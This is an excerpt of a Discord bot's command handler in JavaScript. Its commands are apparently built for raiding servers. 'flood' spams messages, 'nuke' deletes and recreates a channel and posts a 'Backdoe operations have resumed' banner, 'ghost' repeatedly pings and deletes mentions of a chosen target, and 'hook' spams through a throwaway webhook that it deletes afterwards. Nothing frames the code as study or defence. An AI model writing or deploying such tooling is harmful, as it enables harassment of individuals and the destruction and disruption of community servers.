
    // Only process chat input commands.
    if (!interaction.isChatInputCommand()) return;

    const { commandName, options, channel, member } = interaction;

    // --- PANEL COMMAND ---
    if (commandName === 'panel') {
        await interaction.reply({ content: 'Panel command logic needs to be implemented here or imported.', ephemeral: true });
    }

    // --- FLOOD COMMAND ---
    if (commandName === 'flood') {
        const message = options.getString('message');
        const count = options.getInteger('count') || 1;

        if (!channel || !channel.isTextBased()) {
            return interaction.reply({
                content: "Cannot send messages in this type of channel.",
                ephemeral: true,
            });
        }

        try {
            for (let j = 0; j < count; j++) {
                await channel.send(message + " [Master mind]");
            }
            await interaction.reply({
                content: `Successfully sent message ${count} times!`,
                ephemeral: true,
            });
        } catch (error) {
            console.error('Flood command failed:', error);
            if (!interaction.replied) {
                await interaction.reply({ content: 'An error occurred during the flood operation.', ephemeral: true });
            }
        }
    }

    // --- NUKE COMMAND ---
    if (commandName === 'nuke') {
        if (!member.permissions.has('ManageChannels')) {
            return interaction.reply({ content: 'You lack the necessary permissions to nuke this channel.', ephemeral: true });
        }

        try {
            const position = channel.position;
            const parent = channel.parentId;

            const newChannel = await channel.clone({ parent });
            await channel.delete();
            await newChannel.setPosition(position);

            await newChannel.send({
                content: `# ⚠️ CUBAA RESET \n**A clean slate. Backdoe operations have resumed.**`,
                files: [
                    'https://files.catbox.moe/94jn9d.png',
                    'https://files.catbox.moe/h88cpu.gif'
                ]
            });

            await interaction.reply({ content: 'Channel nuke successful.', ephemeral: true });

        } catch (error) {
            console.error('Nuke command failed:', error);
            if (!interaction.replied) {
                await interaction.reply({ content: 'An error occurred during the nuke operation.', ephemeral: true });
            }
        }
    }

    // --- GHOST ---
    if (commandName === 'ghost') {
        const target = options.getMentionable('target');

        try {
            await interaction.reply({ content: `Initiating ghost ping for ${target}`, ephemeral: true });

            for (let i = 0; i < 10; i++) {
                const msg = await channel.send(`${target}`);
                await msg.delete().catch(() => {});
            }

            await interaction.followUp({ content: 'Done.', ephemeral: true });

        } catch (error) {
            console.error('Ghost failed:', error);
        }
    }

    // --- HOOK ---
    if (commandName === 'hook') {
        const content = options.getString('content');
        const count = options.getInteger('count') || 5;

        try {
            await interaction.reply({ content: `Sending ${count} webhook messages...`, ephemeral: true });

            const webhook = await channel.createWebhook({
                name: 'Backdoe System'
            });

            for (let i = 0; i < count; i++) {
                await webhook.send(content);
            }

            setTimeout(() => webhook.delete().catch(() => {}), 5000);

            await interaction.followUp({ content: 'Done.', ephemeral: true });

        } catch (error) {
            console.error('Hook failed:', error);
        }
    }
});
